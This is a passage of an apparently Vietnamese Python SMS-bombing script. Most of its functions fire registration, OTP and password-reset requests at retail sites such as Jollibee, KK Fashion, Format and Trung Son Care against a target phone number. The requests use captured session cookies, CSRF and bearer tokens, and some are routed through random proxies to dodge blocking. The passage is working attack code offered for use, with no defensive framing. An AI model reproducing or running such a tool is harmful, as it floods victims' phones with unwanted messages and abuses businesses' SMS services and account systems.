        'registration_form[city]': 'Hà Nội',
        'registration_form[acceptTerm]': '1',
        'registration_form[oAuthKey]': '',
        'registration_form[utmSource]': 'StarSpin',
        'registration_form[utmMedium]': 'online',
        'registration_form[utmCampaign]': 'Star_Spin_Registration',
        'registration_form[utmTerm]': '',
        'registration_form[utmContent]': '',
        'registration_form[_submit]': '',
        'registration_form[_token]': 'z5MdHYVB9LFdrsPHFED68QUKwogGVRdCltcejZkbHlU',
    }

    proxy = get_random_proxy()
    if proxy and check_proxy(proxy):
        proxies = {
            'http': proxy,
            'https': proxy
        }
        try:
            response = requests.post(
            'https://www.sapporopremiumbeer.com.vn/vi_VN/account/register',
            cookies=cookies,
            headers=headers,
            data=data,proxies=proxies)
            response.raise_for_status()
            print(f"SAPPOROPREMIUMBEER | TRẠNG THÁI : {Fore.GREEN}THÀNH CÔNG (Proxy: {proxy}){Style.RESET_ALL}")
        except requests.exceptions.RequestException:
            print(f"SAPPOROPREMIUMBEER | TRẠNG THÁI : {Fore.RED}THẤT BẠI (Proxy: {proxy}){Style.RESET_ALL}")
            print(response.text)
    else:
        print(f"SAPPOROPREMIUMBEER | TRẠNG THÁI : {Fore.RED}KHÔNG CÓ PROXY HỢP LỆ{Style.RESET_ALL}")

def sapporopremiumbeernor():
    cookies = {
        '_pc_vis': '0299d3f0f9b96c38',
        '_pc_ses': '1734775549831',
        'PHPSESSID': 'gjf1lf43diptl8krosd67gb626',
        '_pc_tss': 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE3MzQ3NzU2MzksInB0ZyI6eyJ2aTpzcnUiOlsxN10sIl9jIjoxNzM0Nzc1NTUwLCJfdSI6MTczNDc3NTU1MH0sImV4cCI6MTczNDc3NzQzOX0.dE7GQG4KnrsVef_8CH3e0MBCUgaEqk64tIlMdXue7Go',
        '_pc_tvs': 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE3MzQ3NzU2MzksInB0ZyI6eyJjbWY6c2ciOnsiODA0NSI6MTJ9LCJfYyI6MTczMzMwMTk3NCwiX3UiOjE3MzQ3NzU2MzksInRnIjp7IjciOjEyfX0sImV4cCI6MTc2NjMxMTYzOX0.7CEaZt2bV2GeVN9-JNSJefIW2ik_b3wUuvhCGwY9KXQ',
    }

    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'cache-control': 'max-age=0',
        'content-type': 'application/x-www-form-urlencoded',
        # 'cookie': '_pc_vis=0299d3f0f9b96c38; _pc_ses=1734775549831; PHPSESSID=gjf1lf43diptl8krosd67gb626; _pc_tss=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE3MzQ3NzU2MzksInB0ZyI6eyJ2aTpzcnUiOlsxN10sIl9jIjoxNzM0Nzc1NTUwLCJfdSI6MTczNDc3NTU1MH0sImV4cCI6MTczNDc3NzQzOX0.dE7GQG4KnrsVef_8CH3e0MBCUgaEqk64tIlMdXue7Go; _pc_tvs=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE3MzQ3NzU2MzksInB0ZyI6eyJjbWY6c2ciOnsiODA0NSI6MTJ9LCJfYyI6MTczMzMwMTk3NCwiX3UiOjE3MzQ3NzU2MzksInRnIjp7IjciOjEyfX0sImV4cCI6MTc2NjMxMTYzOX0.7CEaZt2bV2GeVN9-JNSJefIW2ik_b3wUuvhCGwY9KXQ',
        'origin': 'https://www.sapporopremiumbeer.com.vn',
        'priority': 'u=0, i',
        'referer': 'https://www.sapporopremiumbeer.com.vn/vi_VN/account/register',
        'sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Opera";v="114"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 OPR/114.0.0.0',
    }

    data = {
        'registration_form[phone]': sdt,
        'registration_form[email]': '',
        'registration_form[password][first]': '123123aA@',
        'registration_form[password][second]': '123123aA@',
        'registration_form[fullname]': 'dat ggg',
        'registration_form[city]': 'Hà Nội',
        'registration_form[acceptTerm]': '1',
        'registration_form[oAuthKey]': '',
        'registration_form[utmSource]': 'StarSpin',
        'registration_form[utmMedium]': 'online',
        'registration_form[utmCampaign]': 'Star_Spin_Registration',
        'registration_form[utmTerm]': '',
        'registration_form[utmContent]': '',
        'registration_form[_submit]': '',
        'registration_form[_token]': 'z5MdHYVB9LFdrsPHFED68QUKwogGVRdCltcejZkbHlU',
    }

    try:
        response = requests.post('https://www.sapporopremiumbeer.com.vn/vi_VN/account/register',
        cookies=cookies,
        headers=headers,
        data=data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("SAPPOROPREMIUMBEER NOR | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("SAPPOROPREMIUMBEER NOR | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)    



def hoangphuc():
    cookies = {
        'mage-banners-cache-storage': '{}',
        'PHPSESSID': '07e806bedec57cc595b13d3966f0e09e',
        'form_key': 'zjWPp7y6SO39D6e7',
        'mage-cache-storage': '{}',
        'mage-cache-storage-section-invalidation': '{}',
        'mage-cache-sessid': 'true',
        'form_key': 'zjWPp7y6SO39D6e7',
        'mage-messages': '',
        'recently_viewed_product': '{}',
        'recently_viewed_product_previous': '{}',
        'recently_compared_product': '{}',
        'recently_compared_product_previous': '{}',
        'product_data_storage': '{}',
        'private_content_version': '6b80c27f4a765dceffd8529d6a802732',
        'section_data_ids': '{%22messages%22:null}',
    }

    headers = {
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'cookie': 'mage-banners-cache-storage={}; PHPSESSID=07e806bedec57cc595b13d3966f0e09e; form_key=zjWPp7y6SO39D6e7; mage-cache-storage={}; mage-cache-storage-section-invalidation={}; mage-cache-sessid=true; form_key=zjWPp7y6SO39D6e7; mage-messages=; recently_viewed_product={}; recently_viewed_product_previous={}; recently_compared_product={}; recently_compared_product_previous={}; product_data_storage={}; private_content_version=6b80c27f4a765dceffd8529d6a802732; section_data_ids={%22messages%22:null}',
        'origin': 'https://hoangphuconline.vn',
        'priority': 'u=1, i',
        'referer': 'https://hoangphuconline.vn/customer/account/create/',
        'sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Opera";v="114"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 OPR/114.0.0.0',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'action_type': '1',
        'tel': sdt,
        'form_key': 'zjWPp7y6SO39D6e7',
    }

    try:
        response = requests.post('https://hoangphuconline.vn/advancedlogin/otp/CheckVali/', cookies=cookies, headers=headers, data=data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("HOANGPHUC | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("HOANGPHUC | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def trungsoncarezl():
    cookies = {
        'popNewLogin': '0',
        'sid_customer_s_558c5': '2c6597c4decf004b58a4b188d65efafd-1-C',
        'checkacc': '0',
    }

    headers = {
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Accept-Language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'Cookie': 'popNewLogin=0; sid_customer_s_558c5=2c6597c4decf004b58a4b188d65efafd-1-C; checkacc=0',
        'Origin': 'https://trungsoncare.com',
        'Referer': 'https://trungsoncare.com/auth-loginform/?return_url=index.php%3Fdispatch%3Dorders.search',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 OPR/114.0.0.0',
        'X-Requested-With': 'XMLHttpRequest',
        'sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Opera";v="114"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    params = {
        'dispatch': 'loginbyOTP',
    }

    data = {
        'func': 'getotp',
        'user_type': 'zalo',
        'read_policy': '1',
        'ip_code': '84',
        'user_login': sdt,
        'security_hash': '2e95aca90d025bc949785961ba432043',
    }

    try:
        response = requests.post('https://trungsoncare.com/index.php', params=params, cookies=cookies, headers=headers, data=data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("TRUNGSONCAREZL | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("TRUNGSONCAREZL | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def trungsoncaresms():
    cookies = {
        'popNewLogin': '0',
        'sid_customer_s_558c5': '2c6597c4decf004b58a4b188d65efafd-1-C',
        'checkacc': '0',
    }

    headers = {
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Accept-Language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'Cookie': 'popNewLogin=0; sid_customer_s_558c5=2c6597c4decf004b58a4b188d65efafd-1-C; checkacc=0',
        'Origin': 'https://trungsoncare.com',
        'Referer': 'https://trungsoncare.com/auth-loginform/?return_url=index.php%3Fdispatch%3Dprofiles.update',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 OPR/114.0.0.0',
        'X-Requested-With': 'XMLHttpRequest',
        'sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Opera";v="114"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    params = {
        'dispatch': 'loginbyOTP',
    }

    data = {
        'func': 'getotp',
        'user_type': 'sms',
        'read_policy': '1',
        'ip_code': '84',
        'user_login': sdt,
        'security_hash': '2e95aca90d025bc949785961ba432043',
    }

    try:
        response = requests.post('https://trungsoncare.com/index.php', params=params, cookies=cookies, headers=headers, data=data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("TRUNGSONCARESMS | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("TRUNGSONCARESMS | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def jollibee():
    cookies = {
        'csp': '2',
        'csd': '41',
        'PHPSESSID': '5k1qska2bqhc23a4r3p9km8jil',
        'form_key': 'MecPFiTkWMSnWwXK',
        'form_key': 'MecPFiTkWMSnWwXK',
        'mage-cache-storage': '%7B%7D',
        'mage-cache-storage-section-invalidation': '%7B%7D',
        'mage-cache-sessid': 'true',
        'mage-messages': '',
        'recently_viewed_product': '%7B%7D',
        'recently_viewed_product_previous': '%7B%7D',
        'recently_compared_product': '%7B%7D',
        'recently_compared_product_previous': '%7B%7D',
        'product_data_storage': '%7B%7D',
        'private_content_version': 'e2459d6d59da3a8e9405f93a7c02a85b',
        'section_data_ids': '%7B%22amfacebook-pixel%22%3A1731816340%2C%22notification_count%22%3A1731816340%2C%22apptrian_tiktokpixelapi_matching_section%22%3A1731816340%2C%22customer%22%3A1731816328%2C%22compare-products%22%3A1731816328%2C%22last-ordered-items%22%3A1731816328%2C%22cart%22%3A1731816328%2C%22directory-data%22%3A1731816328%2C%22captcha%22%3A1731816328%2C%22instant-purchase%22%3A1731816328%2C%22loggedAsCustomer%22%3A1731816328%2C%22persistent%22%3A1731816328%2C%22review%22%3A1731816328%2C%22wishlist%22%3A1731816328%2C%22ammessages%22%3A1731816328%2C%22product_area_price%22%3A1731816328%2C%22customer_voucher%22%3A1731816328%2C%22recently_viewed_product%22%3A1731816328%2C%22recently_compared_product%22%3A1731816328%2C%22product_data_storage%22%3A1731816328%2C%22paypal-billing-agreement%22%3A1731816328%2C%22messages%22%3Anull%7D',
    }

    headers = {
        'accept': '*/*',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'cookie': 'csp=2; csd=41; PHPSESSID=5k1qska2bqhc23a4r3p9km8jil; form_key=MecPFiTkWMSnWwXK; form_key=MecPFiTkWMSnWwXK; mage-cache-storage=%7B%7D; mage-cache-storage-section-invalidation=%7B%7D; mage-cache-sessid=true; mage-messages=; recently_viewed_product=%7B%7D; recently_viewed_product_previous=%7B%7D; recently_compared_product=%7B%7D; recently_compared_product_previous=%7B%7D; product_data_storage=%7B%7D; private_content_version=e2459d6d59da3a8e9405f93a7c02a85b; section_data_ids=%7B%22amfacebook-pixel%22%3A1731816340%2C%22notification_count%22%3A1731816340%2C%22apptrian_tiktokpixelapi_matching_section%22%3A1731816340%2C%22customer%22%3A1731816328%2C%22compare-products%22%3A1731816328%2C%22last-ordered-items%22%3A1731816328%2C%22cart%22%3A1731816328%2C%22directory-data%22%3A1731816328%2C%22captcha%22%3A1731816328%2C%22instant-purchase%22%3A1731816328%2C%22loggedAsCustomer%22%3A1731816328%2C%22persistent%22%3A1731816328%2C%22review%22%3A1731816328%2C%22wishlist%22%3A1731816328%2C%22ammessages%22%3A1731816328%2C%22product_area_price%22%3A1731816328%2C%22customer_voucher%22%3A1731816328%2C%22recently_viewed_product%22%3A1731816328%2C%22recently_compared_product%22%3A1731816328%2C%22product_data_storage%22%3A1731816328%2C%22paypal-billing-agreement%22%3A1731816328%2C%22messages%22%3Anull%7D',
        'newrelic': 'eyJ2IjpbMCwxXSwiZCI6eyJ0eSI6IkJyb3dzZXIiLCJhYyI6IjM0MjA2MDQiLCJhcCI6IjEzODU5MjEyNzYiLCJpZCI6IjI5MjAxMWMzZGFmMmE3ZTYiLCJ0ciI6IjlhNDY5MjgzMzUzZTc4NjExYTAyNThmNzAyYzdlN2NhIiwidGkiOjE3MzE4MTUzNjI0MDZ9fQ==',
        'origin': 'https://jollibee.com.vn',
        'priority': 'u=1, i',
        'referer': 'https://jollibee.com.vn/customer/account/create',
        'sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Opera";v="114"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'traceparent': '00-9a469283353e78611a0258f702c7e7ca-292011c3daf2a7e6-01',
        'tracestate': '3420604@nr=0-1-3420604-1385921276-292011c3daf2a7e6----1731815362406',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 OPR/114.0.0.0',
        'x-newrelic-id': 'VwIFUVBTDBABV1FaDwAOUFUD',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'form_key': 'MecPFiTkWMSnWwXK',
        'success_url': '',
        'error_url': '',
        'lastname': 'trabn',
        'firstname': 'dat',
        'phone': sdt,
        'email': 'fasfsaasf@gmail.com',
        'password': '123123aA@',
        'password_confirmation': '123123aA@',
        'dob': '13/11/1997',
        'gender': '1',
        'province_customer': '19',
        'agreement': '1',
        'otp_type': 'create',
        'ip': '171.224.181.204',
    }

    try:
        response = requests.post('https://jollibee.com.vn/otp/action/getOTP', cookies=cookies, headers=headers, data=data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("JOLLIBEE | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("JOLLIBEE | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def kkfashion():
    cookies = {
        'jpresta_cache_context': 'e67fa49f-162d-11ee-9cf4-0692000019e5',
        '_qg_fts': '1721578581',
        'QGUserId': '1896938940101377',
        '_qg_pushrequest': 'true',
        '_qg_cm': '1',
        'PrestaShop-7cbf831598fa6791cd6d07d5b5873d26': 'def502007b8c8eb61736105deec2c85b445e6b2b827b1c9881ead4a1ec5871091282a04d8ff5014f99895733add04bfa3275048c602279d788847264d33d990cebe62d9a15000217ffdd531574e2cdc2848c276e0739404447439d8ce193208fe23a7ec6d710571ea52c1105a2d4d7ee79614b41e1b48de782c3410d1f20ac399f7a0922ff7e5643597bb8cde4bee8dc764d41bec75afe39a9c71c942627ed995e9f5bddc231678f21cf69365f0cf548bc67a888ef420102a0b233c45ed78b2d262d36518dc78b61f6eff594c9e2af4b11e3f25edd',
        'PHPSESSID': 'd6e6f38ea2j2tf3m264h26599v',
        'PrestaShop-03bfe1c20f5691800e1f882876466fe7': 'def50200a1276f3d7b88be6bf9b7363cc6a59f6ba6b1453cb3b46c0633940c04a97756272df36d87542e8a27e57038d4b7936ffed9c1e753d9ee9a30effd837ab2846cf4d3a67fd12c07b04e5aa5c8aaf0be9f8aeecf4c685c42eb85987277010284ddcad86163c8ee6cb7ff98c89909d3de555a7f7fdc5bdbdd9c31bd8882e2dcb962799979fdab88a49b719d3cdaef4617f0c7c735099ae76dd72c8afaa66ce54698d12810f5d9cae8add5a54fc79cab7aaa016f23fb78ac404c03a9ce81a78abaa2cf793ff38929e312c6182028b27dc77105c3c0d5022c5ba4674d25b3a11982034a8080d39601ad371dd8ec95fab4e776f1688c25428aee70f107ce7693a30156b6993e7a777e528a68c86c822cc375ccfa629cf58990ed',
    }

    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'cache-control': 'max-age=0',
        'content-type': 'application/x-www-form-urlencoded',
        # 'cookie': 'jpresta_cache_context=e67fa49f-162d-11ee-9cf4-0692000019e5; _qg_fts=1721578581; QGUserId=1896938940101377; _qg_pushrequest=true; _qg_cm=1; PrestaShop-7cbf831598fa6791cd6d07d5b5873d26=def502007b8c8eb61736105deec2c85b445e6b2b827b1c9881ead4a1ec5871091282a04d8ff5014f99895733add04bfa3275048c602279d788847264d33d990cebe62d9a15000217ffdd531574e2cdc2848c276e0739404447439d8ce193208fe23a7ec6d710571ea52c1105a2d4d7ee79614b41e1b48de782c3410d1f20ac399f7a0922ff7e5643597bb8cde4bee8dc764d41bec75afe39a9c71c942627ed995e9f5bddc231678f21cf69365f0cf548bc67a888ef420102a0b233c45ed78b2d262d36518dc78b61f6eff594c9e2af4b11e3f25edd; PHPSESSID=d6e6f38ea2j2tf3m264h26599v; PrestaShop-03bfe1c20f5691800e1f882876466fe7=def50200a1276f3d7b88be6bf9b7363cc6a59f6ba6b1453cb3b46c0633940c04a97756272df36d87542e8a27e57038d4b7936ffed9c1e753d9ee9a30effd837ab2846cf4d3a67fd12c07b04e5aa5c8aaf0be9f8aeecf4c685c42eb85987277010284ddcad86163c8ee6cb7ff98c89909d3de555a7f7fdc5bdbdd9c31bd8882e2dcb962799979fdab88a49b719d3cdaef4617f0c7c735099ae76dd72c8afaa66ce54698d12810f5d9cae8add5a54fc79cab7aaa016f23fb78ac404c03a9ce81a78abaa2cf793ff38929e312c6182028b27dc77105c3c0d5022c5ba4674d25b3a11982034a8080d39601ad371dd8ec95fab4e776f1688c25428aee70f107ce7693a30156b6993e7a777e528a68c86c822cc375ccfa629cf58990ed',
        'origin': 'https://www.kkfashion.vn',
        'priority': 'u=0, i',
        'referer': 'https://www.kkfashion.vn/dang-nhap?create_account=1',
        'sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Opera";v="114"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 OPR/114.0.0.0',
    }

    params = {
        'create_account': '1',
    }
    random_email = generate_random_email()
    data = {
        'username': 'tran dat',
        'phone': sdt,
        'email': random_email,
        'password': '123123aA@',
        'city': 'Thành phố Cần Thơ',
        'district': 'Huyện Cờ Đỏ',
        'ward': 'Thới Xuân',
        'address2': 'Thới Xuân - Huyện Cờ Đỏ',
        'address1': '22 tan te3 ',
        'submitCreate': '1',
    }

    response = requests.post('https://www.kkfashion.vn/dang-nhap', params=params, cookies=cookies, headers=headers, data=data)

    cookies = {
        '_qg_fts': '1721578581',
        'QGUserId': '1896938940101377',
        '_qg_pushrequest': 'true',
        '_qg_cm': '1',
        'PHPSESSID': 'd6e6f38ea2j2tf3m264h26599v',
        'jpresta_cache_source_6666cd76f96956469e7be39d750cc7d9': '2',
        'PrestaShop-7cbf831598fa6791cd6d07d5b5873d26': 'def5020068bc9968a1f8eaaf0c1d13a95cc8f785bc1e80ef97d2381149d44416b718ea0e1ec703548d1e2c36c17c2fc7bb621176cc5144ba9afbd8e52ab34e62676287139a492a5fb1df85974c1d817955c9dbd66fb0048b6d55396eb82141cd0082257db6f741e461e897ac3bab90f3da71886e4b0a4c48699290185853153f52531995e21cea01e5f336ee0b4f2be6b6eb24eab82935a13898ef71d00e23f59018d4a57353e0ed77c1d620ca46aa302c8dee2b3b4befd342b1db81d32f88c89cc27c55af97e559e6c67e0fc37871bb29cdedb3f218d114857262c878fb3cc1d18c81bb76981cbbc5b2c4f9598485b794288ecc2a4c5f7ad27f78838b5b898f137721fef9c7625ee410bd91cbe2ae87d3a0e2700c5bff120321beec50628206',
        'jpresta_cache_context': 'e67fa49f-162d-11ee-9cf4-0692000019e5',
        'PrestaShop-03bfe1c20f5691800e1f882876466fe7': 'def502004244d73ba44dfc4e9f94dfa641d33aa71985561b821acd2d8a87e724e19921f344cb9602cba1c49d99a5e60c05d71d9022fe3ecb2c8832b6bf3deb69101ae3e8872ff32d28a90f0687bd88bd84ca74216d1e312c2a43f84130230fff88fcc2289870ac6445e93d49ce1bb2bc14b780a65adfea4923c5e9e5a8eb4fde527ca1692bb6e01c850b86614cddd69e138438283f8230e315366ede432762e712bf75a18fd0c078028c11dbeeb8e0813a23608919ec47e413cdc60d0da1cea2cd3f327402ce72e7db4fb60d77d2f7096b6fb0b4bdfc015e4d374f3b143d11c5c5d15b17093c695393ccf24bc6122ec7e960e25b94187f73735c06eb0b71e16d333dd26ea6f24904b4a46e4558359cd94743',
    }

    headers = {
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'cookie': '_qg_fts=1721578581; QGUserId=1896938940101377; _qg_pushrequest=true; _qg_cm=1; PHPSESSID=d6e6f38ea2j2tf3m264h26599v; jpresta_cache_source_6666cd76f96956469e7be39d750cc7d9=2; PrestaShop-7cbf831598fa6791cd6d07d5b5873d26=def5020068bc9968a1f8eaaf0c1d13a95cc8f785bc1e80ef97d2381149d44416b718ea0e1ec703548d1e2c36c17c2fc7bb621176cc5144ba9afbd8e52ab34e62676287139a492a5fb1df85974c1d817955c9dbd66fb0048b6d55396eb82141cd0082257db6f741e461e897ac3bab90f3da71886e4b0a4c48699290185853153f52531995e21cea01e5f336ee0b4f2be6b6eb24eab82935a13898ef71d00e23f59018d4a57353e0ed77c1d620ca46aa302c8dee2b3b4befd342b1db81d32f88c89cc27c55af97e559e6c67e0fc37871bb29cdedb3f218d114857262c878fb3cc1d18c81bb76981cbbc5b2c4f9598485b794288ecc2a4c5f7ad27f78838b5b898f137721fef9c7625ee410bd91cbe2ae87d3a0e2700c5bff120321beec50628206; jpresta_cache_context=e67fa49f-162d-11ee-9cf4-0692000019e5; PrestaShop-03bfe1c20f5691800e1f882876466fe7=def502004244d73ba44dfc4e9f94dfa641d33aa71985561b821acd2d8a87e724e19921f344cb9602cba1c49d99a5e60c05d71d9022fe3ecb2c8832b6bf3deb69101ae3e8872ff32d28a90f0687bd88bd84ca74216d1e312c2a43f84130230fff88fcc2289870ac6445e93d49ce1bb2bc14b780a65adfea4923c5e9e5a8eb4fde527ca1692bb6e01c850b86614cddd69e138438283f8230e315366ede432762e712bf75a18fd0c078028c11dbeeb8e0813a23608919ec47e413cdc60d0da1cea2cd3f327402ce72e7db4fb60d77d2f7096b6fb0b4bdfc015e4d374f3b143d11c5c5d15b17093c695393ccf24bc6122ec7e960e25b94187f73735c06eb0b71e16d333dd26ea6f24904b4a46e4558359cd94743',
        'origin': 'https://www.kkfashion.vn',
        'priority': 'u=1, i',
        'referer': 'https://www.kkfashion.vn/khoi-phuc-mat-khau',
        'sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Opera";v="114"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 OPR/114.0.0.0',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'phone': sdt,
        'otpcode': '',
    }

    try:
        response = requests.post('https://www.kkfashion.vn/module/nj_sms/forgotPassword', cookies=cookies, headers=headers, data=data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("KKFASHION | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("KKFASHION | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def formartvn():
    cookies = {
        'PHPSESSID': 'f6kjgjk5sk9f2vl85c0jlg62eo',
        'internal': 'y',
        'form_key': 'U2yr3syu4swqPV7j',
        'mage-cache-storage': '{}',
        'mage-cache-storage-section-invalidation': '{}',
        'mage-cache-sessid': 'true',
        'recently_viewed_product': '{}',
        'recently_viewed_product_previous': '{}',
        'recently_compared_product': '{}',
        'recently_compared_product_previous': '{}',
        'product_data_storage': '{}',
        'mage-messages': '',
        'form_key': 'U2yr3syu4swqPV7j',
        'private_content_version': '95aa122360b4a512201be0ec5cf5f62f',
        'section_data_ids': '{}',
        'store_login_with_line_cookie': 'j9T4ut',
    }

    headers = {
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        # 'content-length': '0',
        # 'cookie': 'PHPSESSID=f6kjgjk5sk9f2vl85c0jlg62eo; internal=y; form_key=U2yr3syu4swqPV7j; mage-cache-storage={}; mage-cache-storage-section-invalidation={}; mage-cache-sessid=true; recently_viewed_product={}; recently_viewed_product_previous={}; recently_compared_product={}; recently_compared_product_previous={}; product_data_storage={}; mage-messages=; form_key=U2yr3syu4swqPV7j; private_content_version=95aa122360b4a512201be0ec5cf5f62f; section_data_ids={}; store_login_with_line_cookie=j9T4ut',
        'origin': 'https://format.com.vn',
        'priority': 'u=1, i',
        'referer': 'https://format.com.vn/customer/account/create/',
        'sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Opera";v="114"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 OPR/114.0.0.0',
        'x-csrf-token': 'U2yr3syu4swqPV7j',
        'x-requested-with': 'XMLHttpRequest',
    }

    params = {
        'telephone': sdt,
        'action_type': '1',
    }

    try:
        response = requests.get('https://format.com.vn/advancedlogin/otp/sendOtp', params=params, cookies=cookies, headers=headers)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("FORMAT.VN | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("FORMAT.VN | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def theciu():
    headers = {
        'accept': 'application/json',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'authorization': 'Bearer 100914|o6zoFx9fXQSqUtg9tFThrzPfD3w7NLPByck2hahHe2a094ba',
        'content-type': 'application/json',
        'origin': 'https://theciu.vn',
        'priority': 'u=1, i',
        'referer': 'https://theciu.vn/',
